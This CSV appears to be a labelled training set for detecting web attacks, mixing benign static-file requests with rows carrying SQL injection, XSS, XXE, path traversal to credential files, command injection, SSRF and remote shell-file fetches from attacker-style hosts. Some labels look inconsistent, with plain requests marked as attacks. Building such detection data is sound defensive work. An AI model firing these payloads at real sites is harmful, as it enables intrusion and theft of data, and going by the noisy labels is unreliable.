method,path,query,headers,body,ua,label
GET,/assets/icon-update-HR9gXaTw.css,,,HTTP/1.1,,0
GET,/static/css/widget-eval-7E4RFIpz.png,,,HTTP/1.1,,0
GET,id=1' OR '1'='1,,,,,1
GET,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,%0d%0aBcc: victim@example.com,,,,,1
GET,/media/alert.woff2,,,HTTP/1.1,,0
GET,../../../../etc/passwd,,,,,1
GET,/assets/type-where-x7Jxwqc7.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
,/robots.txt,,,,,0
GET,/build/drop-widget-74q2wwiY.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,javascript:setInterval('prom'+'pt(document.domain)'),,,,,1
GET,/static/js/clause-onerror-nTqssd0m.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`,,,,,1
GET,/,,,,,0
GET,/build/menu-whoami-hL0YEOZV.css,,,HTTP/1.1,,0
GET,http://attacker.com/shell.txt,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,id=1' OR '1'='1,,,,,1
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/build/from.js,,,HTTP/1.1,,0
GET,id=1; SELECT pg_sleep(5)--,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/zone-where-AecudkRk.svg,,,HTTP/1.1,,0
GET,/build/form-union-qAf6xAgG.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,?daf76f95d5=Tarun~%3C%22%3E%3Cdetails%2Fopen%2Fontoggle=%22jAvAsCrIpT&colon%3Balert&lpar%3B%2Fxss-by-tarun%2F&rpar%3B%22%3EXXXXX%3C%2Fa%3E,,,,1
GET,' or '1'='1,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,Categories of Web Attacks (50 Categories),,,,,1
GET,/static/css/select.png,,,HTTP/1.1,,0
GET,/static/css/where-zone-OCNfc2Y5.woff2,,,HTTP/1.1,,0
GET,/media/alert.png,,,HTTP/1.1,,0
GET,; cat /et'c/pa'ss'wd,,,,,1
GET,/,%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/assets/eval.min.js,,,HTTP/1.1,,0
GET,/assets/insert.min.css,,,HTTP/1.1,,0
GET,cmd=127.0.0.1 && ls /etc,,,,,1
GET,RCPT TO: test@evil.com,,,,,1
,/,,,,,0
GET,id=1' OR '1'='1,,,,,1
GET,/,?4cbb3ffb50=3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,<script>alert('XSS')</script>,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
POST,/,,,"[{""query"": ""...""}, {""query"": ""...""}]",,1
GET,/static/js/delete-icon-4ccJdTRT.svg,,,HTTP/1.1,,0
GET,id=1'; WAITFOR DELAY '0:0:5'--,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""expect://i d"">]><foo>&xxe;</foo>",,,,,1
GET,/,"""onwheel=ead(111)",,,,1
GET,/media/widget-select-l74TvIkr.jpg,,,HTTP/1.1,,0
GET,/build/update-dialog-hcz7j5aD.jpg,,,HTTP/1.1,,0
GET,javascript:setInterval('ale'+'rt(document.domain)'),,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/static/js/form-script-4tKfXqsB.woff2,,,HTTP/1.1,,0
GET,/static/css/select.css,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/media/function-union-aDpT6431.svg,,,HTTP/1.1,,0
GET,<img src=x onerror=alert(1)>,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
POST,/login,,,Content-Type: application/x-www-form-urlencoded user=john&pass=doe,,0
GET,id=1' OR '1'='1,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/alert-widget-aQYuuKjn.woff2,,,HTTP/1.1,,0
GET,/assets/delete-image-vAUTxRsK.png,,,HTTP/1.1,,0
GET,/build/form-delete-BRNW3T7d.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/build/from-zone-956oTDDk.svg,,,HTTP/1.1,,0
GET,cat /etc/passwd,,,,,1
GET,expect://id,,,,,1
GET,"<video src=x onerror=""prompt(xss"">",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/static/js/whoami-handler-nQJN6Zeg.css,,,HTTP/1.1,,0
GET,/build/where.min.js,,,HTTP/1.1,,0
GET,/,?d52bbdf0d1=%3Cbody%20onload=alert%28%27test1%27%29%3E,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,select from,,,,,1
GET,/media/row-delete-i9g0bXPp.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/type-update-UhsNKqWv.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/css/button-drop-dXeJW39b.jpg,,,HTTP/1.1,,0
GET,"<!--#exec cmd=""wget http://some_host/shell.txt | rename shell.txt sh ell.php""-->",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerr or=eval}throw/0/+name>H</j>#x",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/static/css/whoami.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/static/js/zone-cat-ixQz1CAD.woff2,,,HTTP/1.1,,0
GET,/,"<iframe/onload='this[""src""]=""javas&Tab;cript:al""+""ert``""';>",,,,1
GET,/assets/whoami.js,,,HTTP/1.1,,0
GET,/static/js/eval-image-RZgEXHBj.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/onerror-type-2bEjLVDg.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/where.jpg,,,HTTP/1.1,,0
GET,/assets/onerror-dialog-k8Ves6Bz.css,,,HTTP/1.1,,0
GET,gopher://localhost:6379/_SET%20foo%20bar,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,php://input,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/assets/delete.min.css,,,HTTP/1.1,,0
GET,id=1; DROP TABLE users--,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/css/menu-update-tDCotpqk.svg,,,HTTP/1.1,,0
GET,"/uploads/628668cae9db4d51b4edf55214b73fca-Facebook Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=admin%27or%201=1;--""",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/date-cat-JBfmeW3h.jpg,,,HTTP/1.1,,0
GET,select from,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/tag-union-6Mxk2Mum.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/static/js/clause-union-6hKm7E3I.css,,,HTTP/1.1,,0
GET,/,<xssBypass/onpointermove=(confirm)(1)>MoveMouseHere,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/insert.woff2,,,HTTP/1.1,,0
GET,/static/css/onerror-type-OtGedZ92.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,ac ed 00 05 73 72 00 12 ...,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/script.min.css,,,HTTP/1.1,,0
GET,/static/css/delete.svg,,,HTTP/1.1,,0
GET,javascript:setInterval('prom'+'pt(document.domain)'),,,,,1
GET,/media/whoami.png,,,HTTP/1.1,,0
GET,/static/css/form-eval-a6GZCSAq.svg,,,HTTP/1.1,,0
GET,javascript:setInterval('fet'+'ch(document.domain)'),,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,"""><p only=1337 onmouseenter=window.location.href=//attacker.site>",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/update.css,,,HTTP/1.1,,0
GET,/media/eval.woff2,,,HTTP/1.1,,0
GET,/static/js/delete.min.css,,,HTTP/1.1,,0
GET,/build/onerror-icon-rjdlzgtg.svg,,,HTTP/1.1,,0
POST,/,,,{smart_f_shell_exec('id')},,1
GET,"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by -tarun/&rpar;"">XXXXX</a>",,,,,1
GET,' or string-length(name(.)) > 0 or '1'='1,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,; cat /etc/passwd,,,,,1
GET,/assets/whoami-button-4IuVAQhR.svg,,,HTTP/1.1,,0
GET,"<!DOCTYPE x [ <!ENTITY % y SYSTEM ""//y/y"" > %y; ]><x>a</x>",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,/,/__proto__[v-if]=_c.constructor('alert(1)')(),,,,1
GET,/build/whoami.css,,,HTTP/1.1,,0
GET,/,"""OnCliCk=""(prompt`1`)",,,,1
GET,..%2f..%2f..%2fetc%2fshadow,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/assets/whoami.js,,,HTTP/1.1,,0
GET,"document[""cookie""]",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by -tarun/&rpar;"">XXXXX</a>",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/media/menu-delete-MDHewxN1.jpg,,,HTTP/1.1,,0
GET,../../../../tmp/shell.php (inside zip archive),,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/drop-icon-HcECzoP6.css,,,HTTP/1.1,,0
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*","{` <body \< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,6 6,121,32,77,111,114,112,104,105,110,101)))>´}",,1
POST,/,,,"{""$where"": ""this.user == 'admin'""}",,1
GET,/static/css/eval.woff2,,,HTTP/1.1,,0
GET,/static/js/alert.min.css,,,HTTP/1.1,,0
GET,/assets/whoami.min.js,,,HTTP/1.1,,0
GET,/media/update.jpg,,,HTTP/1.1,,0
GET,"/uploads/628668cae9db4d51b4edf55214b73fca-Facebook Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=admin%27or%201=1;--""",,,,,1
GET,/,php://filter/convert.base64-encode/resource=index.php,,,,1
GET,/build/icon-insert-t42sPpBs.png,,,HTTP/1.1,,0
GET,/build/from-form-ue2lNBCw.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/build/insert-type-hG1qSjvP.css,,,HTTP/1.1,,0
GET,/static/js/widget-onerror-uSUF45nR.png,,,HTTP/1.1,,0
GET,query { __schema { types { name } } },,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/handler-select-wkntuQmz.woff2,,,HTTP/1.1,,0
GET,/static/js/handler-onerror-xq7VnsXQ.css,,,HTTP/1.1,,0
GET,/static/js/button-cat-Pwbglkcl.png,,,HTTP/1.1,,0
GET,//////////////////etc/passwd,,,,,1
GET,gopher://localhost:6379/_SET%20foo%20bar,,,,,1
GET,/,__proto__[v-if]=_c.constructor('alert(1)')(),,,,1
GET,/static/js/image-alert-YqjDlbcl.js,,,HTTP/1.1,,0
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
GET,id=1'; WAITFOR DELAY '0:0:5'--,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,/static/css/date-where-t57YcIVE.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
,/robots.txt,,,,,0
GET,/static/css/script.min.js,,,HTTP/1.1,,0
GET,X-Forwarded-Host: attacker.com,,,,,1
GET,/static/css/update-clause-xsGNYDwc.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/whoami.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,id=1'; WAITFOR DELAY '0:0:5'--,,,,,1
GET,"prompt.call(null,1)",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/static/js/onerror-handler-LChOXWFK.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,php://input,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,"-1134') OR JSON_EXTRACT('{''aKER'': 9648}', '$.aKER') = 9648*7799 AN D ('QlYa' LIKE 'QlYa",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/select.jpg,,,HTTP/1.1,,0
GET,;getent$IFS$9hosts$IFS$9somehost.burpcollaborator.net;echo$IFS$9$((3 482*7301));,,,,,1
GET,/,,,,,0
GET,/build/from-function-1fp4z6CS.png,,,HTTP/1.1,,0
GET,/static/css/insert-date-YOYqoakm.woff2,,,HTTP/1.1,,0
GET,/static/css/form-whoami-ZfwGJxM2.jpg,,,HTTP/1.1,,0
GET,"<iframe srcdoc=""<script>alert(1)</script>"">",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/build/cat-type-FZiipBmQ.woff2,,,HTTP/1.1,,0
GET,/build/onerror.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,cos\nsystem\n(S'id'\ntR.,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/cat-type-8pjPzLND.svg,,,HTTP/1.1,,0
GET,/build/union-form-qAf6xAgG.jpg,,,HTTP/1.1,,0
GET,/,onerror=alert(1),,,,1
GET,/,"""onClick=""(prompt)(1)",,,,1
GET,/assets/delete.svg,,,HTTP/1.1,,0
GET,../../../../etc/passwd,,,,,1
GET,/media/form-whoami-MHcIM1Pk.png,,,HTTP/1.1,,0
